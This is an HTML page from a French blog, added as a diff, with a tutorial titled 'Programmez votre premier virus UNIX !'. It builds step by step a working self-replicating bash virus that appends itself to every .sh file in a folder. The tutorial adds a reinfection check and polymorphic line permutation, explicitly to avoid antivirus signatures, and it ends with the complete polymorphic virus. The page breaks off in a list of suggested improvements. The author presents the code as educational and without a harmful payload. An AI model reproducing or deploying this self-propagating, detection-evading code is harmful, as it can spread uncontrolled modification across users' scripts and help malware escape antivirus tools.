@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="fr" prefix="og: http://ogp.me/ns# fb: https://www.facebook.com/2008/fbml">
+<head>
+    <title>Programmez votre premier virus UNIX ! - The Golden Koala</title>
+    <!-- Using the latest rendering mode for IE -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+    <link href="http://yliesc.github.io/images/koala-ico.png" rel="icon">
+
+<link rel="canonical" href="http://yliesc.github.io/pages/pdp/content/programmez-votre-premier-virus-unix/">
+
+        <meta name="author" content="tcpc" />
+        <meta name="description" content="Le domaine de la virologie Informatique tient une place prépondérante de nos jours. Il suffit, pour s&#39;en apercevoir d&#39;observer le nombre de virus existant et des solutions anti-virales existantes (et de la part du marché qu&#39;elles détiennent). Et paradoxalement, ce domaine reste très obscur, peu enseigné de manière officielle. Souvent …" />
+
+    <meta property="og:site_name" content="The Golden Koala" />
+    <meta property="og:type" content="article"/>
+    <meta property="og:title" content="Programmez votre premier virus UNIX !"/>
+    <meta property="og:url" content="http://yliesc.github.io/pages/pdp/content/programmez-votre-premier-virus-unix/"/>
+    <meta property="og:description" content="Le domaine de la virologie Informatique tient une place prépondérante de nos jours. Il suffit, pour s&#39;en apercevoir d&#39;observer le nombre de virus existant et des solutions anti-virales existantes (et de la part du marché qu&#39;elles détiennent). Et paradoxalement, ce domaine reste très obscur, peu enseigné de manière officielle. Souvent …" />
+
+
+    <!-- Bootstrap -->
+        <link rel="stylesheet" href="http://yliesc.github.io/theme/css/bootstrap.readable.min.css" type="text/css"/>
+    <link href="http://yliesc.github.io/theme/css/font-awesome.min.css" rel="stylesheet">
+
+    <link href="http://yliesc.github.io/theme/css/pygments/default.css" rel="stylesheet">
+    <link href="http://yliesc.github.io/theme/tipuesearch/tipuesearch.css" rel="stylesheet">
+    <link rel="stylesheet" href="http://yliesc.github.io/theme/css/style.css" type="text/css"/>
+        <link href="http://yliesc.github.io/css/custom.css" rel="stylesheet">
+
+        <link href="http://yliesc.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate"
+              title="The Golden Koala ATOM Feed"/>
+
+
+
+
+</head>
+<body>
+
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+	<div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a href="http://yliesc.github.io/" class="navbar-brand">
+<img class="img-responsive pull-left gap-right" src="http://yliesc.github.io/images/koala-logo.svg" width="38"/> <span id="siteName">The Golden Koala</span>            </a>
+        </div>
+        <div class="collapse navbar-collapse navbar-ex1-collapse">
+            <ul class="nav navbar-nav">
+
+            </ul>
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+</div> <!-- /.navbar -->
+<!-- Banner -->
+<!-- End Banner -->
+<div class="container">
+    <div class="row">
+        <div class="col-sm-9">
+    <ol class="breadcrumb">
+        <li><a href="http://yliesc.github.io/" title="The Golden Koala">
+            <i class="fa fa-home fa-lg"></i>
+        </a></li>
+        <li class="active">Programmez votre premier virus UNIX !</li>
+    </ol>
+    <section id="content" class="body">
+        <h1 class="entry-title">Programmez votre premier virus UNIX !</h1>
+            <div class="entry-content">
+                    <div class="panel">
+                        <div class="panel-body">
+<footer class="post-info">
+    
+    <span class="published">
+        <span class="label label-default"><i class="fa fa-calendar"></i><time datetime="2014-09-27T00:00:00+02:00"> sam. 27 septembre 2014</time></span> | 
+    </span>
+        <span class="label label-default"><i class="fa fa-user-circle"></i> tcpc</span>  | 
+    <span class="label label-default">
+            <i class="fa fa-cc"></i> 
+        
+            CC-BY-SA
+    </span>
+</footer><!-- /.page-info -->                        </div>
+                    </div>
+            <p>Le domaine de la <strong>virologie Informatique</strong> tient une place prépondérante de nos jours. Il suffit, pour s'en apercevoir d'observer le nombre de virus existant et des solutions anti-virales existantes (et de la part du marché qu'elles détiennent). Et paradoxalement, ce domaine reste très obscur, peu enseigné de manière officielle. Souvent perçu par le peuple comme un domaine très obscur, réservé aux petits génies et autres hackers, autant d'idées véhiculées très largement par les médias, la virologie est pourtant abordable par tous pour peu d'avoir quelques connaissances de base et beaucoup de motivation. De nombreux travaux universitaires ont par ailleurs été réalisés afin de mettre en lumière ce domaine et pouvoir l'aborder de manière rigoureuse. Les « virus » peuvent ainsi être décrits de manière totalement formelle afin d'être étudiés en profondeur et ce, de manière (très) théorique.</p>
+<p>Mais commençons modestement et contentons-nous d'une petite introduction sur les virus Unix où nous aurons l'occasion de coder notre premier virus ! Je pense en effet que ce qui est excitant avec ce domaine, outre le fait qu'il soit perçu comme obscur, c'est qu'il est possible de bien s'amuser en bidouillant un peu et en se servant concrètement de son ordinateur. Bref, nulle théorie ne sera abordée dans ce premier article bien que je n'exclus pas l'idée d'en parler dans de prochains billets mais cela ne nous empêchera pas de commencer les choses sérieuses (de manière spontanée, j'ai l'impression qu'on peut aller très loin dans la pratique de la virologie sans connaître une once de théorie derrière, la pratique et la théorie me semblant être assez décorrélées).</p>
+<p>Je tiens à préciser que vous pouvez exécuter tous les codes présents ici sans aucune crainte (exécutez-les cependant dans un dossier de tests, isolé du reste), ils ne sont pas malveillants (cet article ayant avant tout un but pédagogique). Lire l'article avec un Shell à côté serait même une très bonne idée pour assimiler ce qui va suivre et bien comprendre les choses (en vous amusant). Ne vous étonnez pas si l'exécution d'un code échoue parfois, lisez l'article !</p>
+<div class="toc">
+<ul>
+<li><a href="#definition-et-implementation-dun-virus">Définition et implémentation d'un virus</a></li>
+<li><a href="#principes-fondamentaux-dun-virus">Principes fondamentaux d'un virus</a></li>
+<li><a href="#conception-dun-virus-plus-evolue">Conception d'un virus plus évolué</a><ul>
+<li><a href="#non-surinfection">Non-surinfection</a></li>
+<li><a href="#polymorphisme">Polymorphisme</a></li>
+<li><a href="#bilan-et-ameliorations">Bilan et améliorations</a></li>
+</ul>
+</li>
+</ul>
+</div>
+<h1 id="definition-et-implementation-dun-virus">Définition et implémentation d'un virus</h1>
+<p>Avant de voir du code et de passer à la pratique, quelques petites notions de base en virologie s'imposent. Commençons par le commencement, qu'est-ce qu'un « virus » ?</p>
+<p>Un virus, c'est tout simplement un <strong>automate auto-reproducteur</strong>. En bref, c'est juste un programme qui va se reproduire lui-même au fil de ses multiples exécutions. Il est intéressant de noter qu'un virus n'est donc fondamentalement pas nocif et malveillant comme on le conçoit d'ordinaire. Cela dit, quand il est exécuté sur un fichier dit <em>infecté</em>, il va se propager de fichier en fichier, s'auto-reproduisant pour finalement infecter tout le système puis passer à d'autres systèmes non infectés.</p>
+<p>On peut donc dès à présent coder un tout petit virus minimaliste. Il s'agit d'un programme qui va s'auto-reproduire de cible en cible, i.e. qui va dupliquer son propre code source sur tous les fichiers infectés. Les fichiers exécutables en <code>.sh</code> constituent une bonne cible de départ. En effet, ayant déjà des droits d'exécution, on peut donc les infecter par un code qui s'exécutera sans aucun soucis lié aux permissions.</p>
+<p>En utilisant la commande <a href="http://pwet.fr/man/linux/commandes/tail">tail</a> on peut donc écrire par exemple :</p>
+<div class="highlight"><pre><span></span><span class="k">for</span> f in *.sh<span class="p">;</span> <span class="k">do</span>
+  tail -n <span class="m">3</span> <span class="nv">$0</span> &gt;&gt; <span class="nv">$f</span>
+<span class="k">done</span>
+</pre></div>
+
+
+<p>Reste à savoir si c'est un virus efficace…</p>
+<h1 id="principes-fondamentaux-dun-virus">Principes fondamentaux d'un virus</h1>
+<p>Maintenant qu'on a vu succinctement ce qu'est un virus, touchons trois mots à propos des antivirus (cela justifiera d'autant plus la suite de l'article). De manièrement informelle, on peut voir un antivirus comme un programme qui scanne le système de temps en temps et qui surveille de manière continue les points stratégiques (ports TCP et cie). Ce programme est chargé de trouver des anomalies qui pourraient révéler la présence de virus. Par exemple, notre précédent virus va infecter tous les fichiers en <code>.sh</code> du système en leur dupliquant son code source. L'antivirus, en scannant par exemple ces fichiers, va s'apercevoir qu'un motif récurrent apparaît. Il va consulter sa base de données et ainsi détecter la présence du dit virus. Autre exemple, l'exécution d'un programme alloue étrangement trop de mémoire ou prends trop de temps. L'antivirus va scanner en particulier le code de ce programme et trouvera sans doute le virus, au moyen toujours de sa base de données. Bien que simplistes, ces exemples donnent de petites idées sur le fonctionnement d'un antivirus.</p>
+<p>Ainsi, afin d'assurer une bonne auto-reproduction, il existe trois concepts fondamentaux qui régissent le fonctionnement d'un virus afin que ce dernier ne se fassent pas trop vite repérer par un antivirus. À savoir :</p>
+<ul>
+<li>
+<p>La <strong>non-surinfection</strong> : le virus ne doit pas infecter un fichier déjà infecté ! Si tel était le cas, on aurait des <em>boucles infinies</em> allouant quantité de mémoire et notre virus se ferait très vite détecter (en plus de ne pas fonctionner).</p>
+</li>
+<li>
+<p>Le <strong>polymorphisme</strong> : le virus doit changer de forme au cours de son auto-reproduction afin de ne pas constituer une signature fixe exploitable par un antivirus. Si il doit changer de forme, il ne doit surtout pas changer de fond ! Chaque auto-reproduction doit donc être équivalente bien que différente en apparence !</p>
+</li>
+<li>
+<p>La <strong>furtivité</strong> : le virus doit passer inaperçu aux yeux d'un antivirus et de son utilisateur !</p>
+</li>
+</ul>
+<p>Les deux premiers concepts sont abordés dans cet article, le troisième pourrait constituer un article futur.</p>
+<p>Reprenons notre premier virus précédent et regardons si il vérifie les concept énoncés ci-dessus. Notre virus lutte-t-il contre la surinfection ? Non, un fichier cible déjà infecté se verra encore infecter si notre virus est exécuté. Notre virus est-t-il polymorphe ? Non plus, il est rigoureusement le même au fil des auto-reproductions. Et est-t-il furtif ? Je ne crois pas, son code source apparaissant en clair ! Bref, notre premier virus minimaliste est bien un virus mais il se fera très très vite attraper par le premier antivirus passant par-là...</p>
+<p>Basons-nous sur cet exemple minimaliste pour construire un virus plus évolué au fil de l'article, en enrichissant nos trois lignes de code et surtout, en essayant de respecter les deux premiers principes vus ci-dessus !</p>
+<h1 id="conception-dun-virus-plus-evolue">Conception d'un virus plus évolué</h1>
+<p>Commençons donc par nous interroger sur la question de la non-surinfection !</p>
+<h3 id="non-surinfection">Non-surinfection</h3>
+<p>Il s'agit donc de détecter la présence de notre virus dans un fichier cible afin de ne pas le ré-infecter. La première approche qui nous vient en tête est sans doute celle de la vérification par clé. En bref, une simple clé attesterai de la présence ou non du virus. Quelque chose dans l'esprit de :</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">[</span> -z <span class="k">$(</span>grep nkoazdpokdaznojazd cible.sh<span class="k">)</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  <span class="k">continue</span>
+<span class="k">fi</span>
+...
+</pre></div>
+
+
+<p>Cependant cette méthode, bien que simple et très efficace pour la non-surinfection (on peut être certain que le virus ne sera pas dupliqué dans un fichier déjà infecté et ce, même si le virus se situe n'importe où) n'est pas du tout pertinente. Les antivirus ont un fonctionnement de base qui s'appuie sur des <strong>signatures fixes</strong>. Ils « lisent » l'infection proprement dite d'un virus, regardent les éléments qui demeurent constants au fil des reproductions du virus et les utilisent par la suite pour reconnaître le virus (via des fonctions de hashage et de grosses bases de données). Autrement dit, si un virus souhaite passer entre les mailles de ce premier filet, il ne doit pas laisser de signatures fixes dans ses infections ! Or notre clé de reconnaissance est justement une signature fixe… Bref, vous l'aurez compris, cette idée n'est pas satisfaisante pour notre projet.</p>
+<p>Une autre méthode consisterait à chercher le code source exact du virus dans le fichier cible afin de vérifier sa présence mais c'est exactement la même idée que celle ci-dessus (modulo le fait que la clé devient plus longue, ce qui ne nous avance guère).</p>
+<p>Il y a maintenant une solution plus élégante que celle proposée ci-dessus et surtout beaucoup plus efficace contre l'utilisation des signatures fixes par un antivirus. Il s'agit d'exécuter les X dernières lignes du fichier cible et d'observer le code de retour : si tout va bien, on obtient un <code>exit 0</code> et sinon une erreur (qu'on peut faire taire en redirigeant vers <code>/dev/null</code>). L'<code>exit 0</code> témoigne de la présence du virus (qui est donc exécuté) et l'erreur, de son absence.</p>
+<p>Cela dit, cette idée fait quand même l'approximation que les X dernières exécutées renverront bien une erreur en cas d'absence du virus (ce qui peut ne pas être le cas dans la pratique, bien évidemment (X lignes constituées d'instructions comme <code>echo …</code> par exemple renverront un <code>exit 0</code>)). On pourra donc au préalable compter le nombre de lignes du fichier cible et si il est inférieur à celui de notre virus, directement infecter ce fichier (qui ne contient donc forcément pas notre virus). Et si notre fichier cible contient plus de X lignes, c'est que les X dernières lignes sont en théorie dépendantes des lignes précédentes et donc que leur exécution renverra une erreur.</p>
+<p>Cette technique fonctionne donc a priori puisque l'antivirus n'a aucune signature fixe sur laquelle baser sa défense, la vérification de la non-surinfection se faisant dynamiquement, par exécution de code.</p>
+<p>Notre virus contiendra donc dans un premier temps un petit test afin de savoir si l'exécution du fichier à infecter est effectuée pour vérifier la non-surinfection, en faisant par exemple <code>./cible.sh test</code> (l'argument test attestera de notre demande de vérification) :</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;test&quot;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  <span class="nb">exit</span> <span class="m">0</span>
+<span class="k">fi</span>
+</pre></div>
+
+
+<p>Puis dans un deuxième temps, on effectue le comptage de lignes du fichier cible comme décrit précedemment et ce, grâce à la fonction <a href="http://pwet.fr/man/linux/commandes/wc">wc</a> et <a href="http://pwet.fr/man/linux/commandes/cut">cut</a> puis on opère en fonction du résultat (par rapport à la longueur X de notre virus donc). Dans le cas où on doit tester les X dernières lignes, on récupère celle-ci via la fonction tail, on redirige le résultat dans un fichier nommé virus puis on exécute celui-ci en regardant la sortie. Un exit 0 provoquera un changement de cible, celle courante étant donc déjà infectée :</p>
+<div class="highlight"><pre><span></span><span class="nv">nbrlines</span><span class="o">=</span><span class="sb">`</span>wc -l <span class="nv">$f</span> <span class="p">|</span> cut -f1 -d<span class="s1">&#39; &#39;</span><span class="sb">`</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$nbrlines</span> -gt <span class="m">16</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  tail -n X <span class="nv">$cible</span> &gt; virus
+  chmod +x virus
+  ./.virus <span class="nb">test</span> &gt; /dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">&amp;&amp;</span> <span class="k">continue</span>
+<span class="k">fi</span>
+</pre></div>
+
+
+<p>Les opérateurs de logique sont ici bien adaptés afin de connaître le code de retour d'une exécution. Pour un <code>cmd &gt; /dev/null 2&gt;&amp;1 &amp;&amp; cmd1 || cmd2</code>, <code>cmd1</code> sera exécutée si et seulement si <code>cmd</code> renvoie un <code>exit 0</code> et <code>cmd2</code> si et seulement si <code>cmd</code> échoue (et par ailleurs, <code>cmd</code> ne redirigera aucun résultat sur la sortie standard).</p>
+<p>Maintenant que nous savons gérer de manière un peu plus correcte notre gestion de la non-surinfection, intéressons-nous au polymorphisme de notre virus !</p>
+<h3 id="polymorphisme">Polymorphisme</h3>
+<p>L'objectif de cette partie est de rendre théoriquement invisible l'auto-reproduction du virus aux yeux d'un antivirus.</p>
+<p>Il ne s'agit pas de modifier intrinsèquement notre virus mais de le modifier dans la forme, en apparence, de façon à ce qu'il soit <strong>strictement</strong> équivalent à chaque reproduction. Après plusieurs réflexions, le concept de code mutant me paraît être assez efficace : le code source du virus va muter en se propageant de fichier en fichier. Il suffit par exemple d'effectuer une permutation aléatoire du code source de propagation en propagation afin de mettre en oeuvre cette mutation. (N'hésitez pas à me proposer vos idées de concepts de polymorphisme.)</p>
+<p>Comment implémenter ce comportement en pratique ? Un obstacle se pose dès le départ, comment assurer la bonne exécution du virus si son code est permuté de façon aléatoire au fil de sa propagation ? Instinctivement, on se dit avoir besoin d'une fonction qui appliquera la permutation inverse au code lors de son exécution afin que toutes les instructions se déroule dans le bon ordre. Mais cette fonction appartient à notre virus, elle sera a priori elle-même permutée avec le reste du code. Mais pourquoi donc la permuter ? Fixons-là au début de notre virus et permutons le reste du code en dessous ! Mais cette fonction apparaîtra donc comme une signature fixe au yeux d'un antivirus…</p>
+<p>Après ces quelques réflexions, le polymorphisme semblerait être au final un problème épineux. Il va nous falloir ruser pour contourner les quelques problèmes énoncés ci-dessus mais notre idée de base (permutation aléatoire du code du virus) est cependant bien la bonne, je vous rassure.</p>
+<p>Essayons dans un premier temps d'implémenter notre polymorphisme de base : le virus va effectuer une permutation aléatoire de son code à chaque reproduction et une fonction placée en en-tête s'assurera de la permutation inverse afin d'exécuter le virus. On serait tenté de vouloir utiliser la fonction   <a href="http://pwet.fr/man/linux/commandes/sort">sort</a> de base afin de ne pas ré-inventer la roue. C'est une bonne idée car elle facilite vraiment beaucoup la gestion de ces permutations. Un <code>man sort</code> vous permettra de vous renseigner sur les différents arguments possibles et il se trouve que certains d'entre eux nous intéressent ! Un <code>sort -R virus.sh</code> va par exemple permuter aléatoirement le code de notre virus ! Mais comment appliquer la permutation inverse puisque la permutation initiale étant aléatoire, on ne la connait pas ? Le terme même de "sort" devrait vous aiguiller, on va trier le code source de notre virus à l'aide de <code>sort</code> ! Sans argument, <code>sort</code> triera tout notre code en fonction du premier caractère de chaque ligne, ça n'est pas très intéressant. L'astuce est donc de forcer <code>sort</code> à trier notre code de façon numérique mais pour cela il nous faut des nombres dans notre code. <strong>Merveilleuse existence des commentaires !</strong></p>
+<p>On va numéroter chaque ligne de notre virus à l'aide des commentaires, quelque chose comme : <code># @7</code> pour la septième ligne, par exemple. Il nous suffira ensuite d'appliquer un <code>sort -R virus.sh</code> pour permuter aléatoirement notre virus, comme expliqué précedemment, puis un <code>sort -n -t@ -k2 virus.sh</code> pour remettre en place notre virus (<code>-n</code> signifie qu'on trie numériquement, <code>-t</code> indique le séparateur qu'on utilise pour indiquer les nombres à utiliser et <code>-k</code> sélectionne le côté de la séparation qui nous intéresse (appliquer un <code>-t@</code> coupera <code># @7</code> en deux, d'un côté <code>#</code>, de l'autre <code>7</code> (c'est donc le deuxième côté qui nous intéresse))).</p>
+<p>Commençons un peu à coder (sans nous préoccuper d'intégrer maintenant notre code de non-surinfection) :</p>
+<div class="highlight"><pre><span></span>tail -n <span class="m">4</span> <span class="nv">$0</span> <span class="p">|</span> sort -n -t@ -k2 &gt; virus <span class="o">&amp;&amp;</span> chmod +x virus <span class="o">&amp;&amp;</span> ./virus
+<span class="k">for</span> f in *.sh<span class="p">;</span> <span class="k">do</span> <span class="c1"># @1</span>
+  <span class="nb">echo</span> <span class="s1">&#39;tail -n 4 $0 | sort -n -t@ -k2 &gt; virus &amp;&amp; chmod +x virus &amp;&amp; ./virus&#39;</span> &gt;&gt; <span class="nv">$f</span> <span class="c1"># @2</span>
+  tail -n <span class="m">4</span> <span class="nv">$0</span> <span class="p">|</span> sort -R &gt;&gt; <span class="nv">$f</span> <span class="c1"># @3</span>
+<span class="k">done</span> <span class="c1"># @4</span>
+</pre></div>
+
+
+<p>Je n'ai pas grand chose à ajouter, la première ligne constitue notre fonction qui va remettre en ordre le code du virus au-dessous d'elle (qui est potentiellement permuté) puis l'exécuter. Le virus va ensuite, pour chaque cible en <code>.sh</code>, ajouter cette fonction au fichier à infecter puis ajouter les quatre dernières lignes de son code, permutées par sort.</p>
+<p>Voici un fichier cible d'exemple :</p>
+<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s1">&#39;Ceci est un fichier infecté. :(&#39;</span>
+</pre></div>
+
+
+<p>L'exécution de notre virus précédent va infecter ce fichier cible comme cela, par exemple :</p>
+<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s1">&#39;Ceci est un fichier infecté. :(&#39;</span>
+tail -n <span class="m">4</span> <span class="nv">$0</span> <span class="p">|</span> sort -n -t@ -k2 &gt; virus <span class="o">&amp;&amp;</span> chmod +x virus <span class="o">&amp;&amp;</span> ./virus
+  <span class="nb">echo</span> <span class="s1">&#39;tail -n 4 $0 | sort -n -t@ -k2 &gt; virus &amp;&amp; chmod +x virus &amp;&amp; ./virus&#39;</span> &gt;&gt; <span class="nv">$f</span> <span class="c1"># @2</span>
+<span class="k">done</span> <span class="c1"># @4</span>
+  tail -n <span class="m">4</span> <span class="nv">$0</span> <span class="p">|</span> sort -R &gt;&gt; <span class="nv">$f</span> <span class="c1"># @3</span>
+<span class="k">for</span> f in *.sh<span class="p">;</span> <span class="k">do</span> <span class="c1"># @1</span>
+</pre></div>
+
+
+<p>(Et l'exécution de ce fichier infecté va suivre le comportement décrit juste ci-dessus.)</p>
+<p>Afin d'améliorer notre polymorphisme, il serait intéressant de permuter la position de la première ligne (la fonction de permutation inverse) en même temps que le reste du code. Cela pose cependant un gros problème, comment appliquer alors la permutation inverse ?</p>
+<p>La solution se trouve encore… dans les commentaires ! Eh oui, en commentant tout le virus sauf la fonction de permutation inverse, on peut permuter à souhait le code entier et son exécution commencera donc forcément par notre fonction de permutation inverse (puisque le reste du code est un commentaire). Il faudra simplement décommenter notre code en le triant puis l'exécuter. On va utiliser ici les commandes <a href="http://pwet.fr/man/linux/commandes/sed">sed</a> et <code>cut</code> pour respectivement commenter et décommenter notre code. Le commenter est plus délicat car il s'agit de rajouter <code>#</code> à chaque début de ligne. C'est ici que rentre en jeu la très puissante commande <code>sed</code> qui, en quelques mots, manipule des fichiers ligne par ligne selon les instructions de l'utilisateur (le plus souvent sous forme de regex). Je vous laisse consulter le manuel, notre utilisation se résumant à un <code>sed -i "s/^/# /"</code> (l'argument <code>-i</code> indique l'ajout de caractères à une ligne et la <code>regex s/^/#</code> indique qu'on rajoute <code>#</code> à chaque début de ligne (<code>^</code>)). La commande <code>cut</code> va s'utiliser avec l'argument <code>-c</code> qui indique qu'on considère notre code comme un tableau auquel on choisit les colonnes à afficher. En commentant, on ajoute un dièse et un espace (colonne 1 et 2), on va donc sélectionner tout le code à partir de la colonne 3 ce qui se fait comme ceci : <code>cut -c3- virus</code>. Il faut enfin changer la position de la première ligne dans le fichier cible et ce, toujours avec la commande <code>sed</code> utilisée comme ceci : <code>sed -i "/POSITION/ i\PREMIERE LIGNE"</code> (on insère la <code>PREMIERE LIGNE</code> au-dessus de la <code>POSITION-ième</code> ligne et ce, aléatoirement ; consultez le manuel pour plus de précisions).</p>
+<p>Modifions un peu notre code précédent :</p>
+<div class="highlight"><pre><span></span>tail -n <span class="m">7</span> <span class="nv">$0</span> <span class="p">|</span> cut -c3- <span class="p">|</span> sort -n -t@ -k2 &gt; virus <span class="o">&amp;&amp;</span> chmod +x virus <span class="o">&amp;&amp;</span> ./virus
+<span class="c1"># for f in *.sh; do # @1</span>
+<span class="c1">#   tail -n 6 $0 | sort -R &gt; infection # @2</span>
+<span class="c1">#   sed -i &quot;s/^/# /&quot; infection # @3</span>
+<span class="c1">#   sed -i &quot;/$[ RANDOM % 7 ] i\tail -n 7 $0 | cut -c3- | sort -n -t@ -k2 &gt; virus &amp;&amp; chmod +x virus &amp;&amp; ./virus&quot; infection #@4</span>
+<span class="c1">#   cat infection &gt;&gt; $f # @5</span>
+<span class="c1"># done # @6</span>
+</pre></div>
+
+
+<p>En exécutant ce code, vous obtiendrez sans doute une erreur vous signifant que « La commande -il n'existe pas. ». « il », « tail », cela se ressemble, non ? Il semblerait que nous ayons fait une erreur de raisonnement. En appliquant la commande <code>cut -c3-</code> au fichier infecté avant le tri des dernières lignes, afin de décommenter le code, on oublie que la fonction de permutation inverse n'est pas commentée et donc qu'on coupe la commande <code>tail</code> en commençant par la colonne 3. Une astuce ? Rajouter deux espaces pour s'aligner sur le code commenté ! (On peut tout aussi bien changer la position de <code>cut -c3-</code> pour la mettre après <code>sort -n -t@ -k2</code> puisqu'il s'agit en fait de l'ordre des commandes qui n'est pas anodin.)</p>
+<p>Il y a cependant une autre erreur de raisonnement. En effet, si vous exécutez ce code, il n'infectera aucun fichier. En effet, dans la première ligne nous récupérons le virus entier via <code>tail -n 7 $0</code> puis nous mettons le code ordonné dans un fichier virus que nous exécutons. Mais le fichier virus exécuté contient exactement la même première ligne que ci-dessus… On va donc toujours rester bloqué à la première ligne. Suffirait-il de modifier le <code>tail -n 7</code> en <code>tail -n 6</code> ? Eh non, car notre première ligne peut potentiellement se retrouver ailleurs puisque le code du virus est permuté et il faut donc bien récupérer les 7 lignes (i.e. le virus entier). L'astuce consiste à rajouter un <code>tail -n 6</code> à la suite.</p>
+<p>Au final :</p>
+<div class="highlight"><pre><span></span>  tail -n <span class="m">7</span> <span class="nv">$0</span> <span class="p">|</span> cut -c3- <span class="p">|</span> sort -n -t@ -k2 <span class="p">|</span> tail -n <span class="m">6</span> &gt; virus <span class="o">&amp;&amp;</span> chmod +x virus <span class="o">&amp;&amp;</span> ./virus
+<span class="c1"># for f in *.sh; do # @1</span>
+<span class="c1">#   tail -n 6 $0 | sort -R &gt; infection # @2</span>
+<span class="c1">#   sed -i &quot;s/^/# /&quot; infection # @3</span>
+<span class="c1">#   sed -i &quot;/$[ RANDOM % 7 ] i\  tail -n 7 $0 | cut -c3- | sort -n -t@ -k2 | tail -n 6 &gt; virus &amp;&amp; chmod +x virus &amp;&amp; ./virus&quot; infection #@4</span>
+<span class="c1">#   cat infection &gt;&gt; $f # @5</span>
+<span class="c1"># done # @6</span>
+</pre></div>
+
+
+<p>Il y a cependant, un autre soucis. Eh oui, c'est le problème avec ce genre de programme qui se « mord la queue », à première vue on ne pense pas forcément à toutes les subtilités ! (Remarquez que ça rend la chose d'autant plus intéressante.) A priori, notre virus permuté ne sera jamais trié dans l'ordre convenable. C'est pourtant étonnant, non ? Je ne pense pas avoir dis de bêtises et la commande sort est quand même fiable je suppose. Le problème vient pourtant bien de notre tri. Rappelez-vous, nous trions le code permuté grâce à la commande <code>sort -n -t@ -k2</code> et <code>@</code> est donc le séparateur censé précéder le numéro de la ligne courante. Observez bien le code… Le symbole <code>@</code> est utilisé ailleurs et c'est cela qui perturbe le fonctionnement de notre tri. Arrivé à ce constat, j'avoue avoir été un peu dégoûté, bloqué si proche du but. La solution la plus facile consisterai à représenter le <code>@</code> d'une autre manière. Merci Bash et sa possibilité d'exécuter des commandes via <code>``</code> ! Servons nous par exemple de la représentation hexadécimale. <code>@</code> est encodé par le nombre <code>40</code>, il ne reste plus qu'à remplacer les <code>@</code> intempestifs par des <code>printf "\x40\n"</code> :</p>
+<div class="highlight"><pre><span></span>  tail -n <span class="m">7</span> <span class="nv">$0</span> <span class="p">|</span> cut -c3- <span class="p">|</span> sort -n -t<span class="sb">`</span><span class="nb">printf</span> <span class="s2">&quot;\x40\n&quot;</span><span class="sb">`</span> -k2 <span class="p">|</span> tail -n <span class="m">6</span> &gt; virus <span class="o">&amp;&amp;</span> chmod +x virus <span class="o">&amp;&amp;</span> ./virus
+<span class="c1"># for f in *.sh; do # @1</span>
+<span class="c1">#   tail -n 6 $0 | sort -R &gt; infection # @2</span>
+<span class="c1">#   sed -i &quot;s/^/# /&quot; infection # @3</span>
+<span class="c1">#   sed -i &quot;/$[ RANDOM % 7 ] i\  tail -n 7 $0 | cut -c3- | sort -n -t`printf &quot;\x40\n&quot;` -k2 | tail -n 6 &gt; virus &amp;&amp; chmod +x virus &amp;&amp; ./virus&quot; infection #@4</span>
+<span class="c1">#   cat infection &gt;&gt; $f # @5</span>
+<span class="c1"># done # @6</span>
+</pre></div>
+
+
+<p>Enfin un code qui fonctionne !</p>
+<h3 id="bilan-et-ameliorations">Bilan et améliorations</h3>
+<p>Après avoir bien amélioré notre virus minimaliste de départ qui tenait, je vous le rappelle, en trois lignes, voilà notre virus polymorphe final :</p>
+<div class="highlight"><pre><span></span>  tail -n <span class="m">15</span> <span class="nv">$0</span> <span class="p">|</span> cut -c3- <span class="p">|</span> sort -n -t<span class="sb">`</span><span class="nb">printf</span> <span class="s2">&quot;\x40\n&quot;</span><span class="sb">`</span> -k2 <span class="p">|</span> tail -n <span class="m">14</span> &gt; virus <span class="o">&amp;&amp;</span> chmod +x virus <span class="o">&amp;&amp;</span> ./virus
+<span class="c1"># if [ &quot;$1&quot; == &quot;test&quot; ]; then # @1</span>
+<span class="c1">#   exit 0 # @2</span>
+<span class="c1"># fi # @3</span>
+<span class="c1"># for f in *.sh; do # @4</span>
+<span class="c1">#   nbrlines=`wc -l $f | cut -f1 -d&#39; &#39;` # @5</span>
+<span class="c1">#   if [ $nbrlines -gt 14 ]; then # @6</span>
+<span class="c1">#     tail -n 15 $f | cut -c3- | sort -n -t`printf &quot;\x40\n&quot;` -k2 | tail -n 14 &gt; test &amp;&amp; chmod +x test # @7</span>
+<span class="c1">#     ./test test &gt; /dev/null 2&gt;&amp;1 &amp;&amp; continue # @8</span>
+<span class="c1">#   fi # @9</span>
+<span class="c1">#   tail -n 14 $0 | sort -R &gt; infection # @10</span>
+<span class="c1">#   sed -i &quot;s/^/# /&quot; infection # @11</span>
+<span class="c1">#   sed -i &quot;/$[ RANDOM % 15 ]/ i\  tail -n 15 $0 | cut -c3- | sort -n -t`printf &quot;\x40\n&quot;` -k2 | tail -n 14 &gt; virus &amp;&amp; chmod +x virus &amp;&amp; ./virus&quot; infection #@12</span>
+<span class="c1">#   cat infection &gt;&gt; $f # @13</span>
+<span class="c1"># done # @14</span>
+</pre></div>
+
+
+<p>Nous nous arrêterons là mais voici quelques améliorations possibles afin de vous exercez tout seul :</p>
+<ul>
+<li>
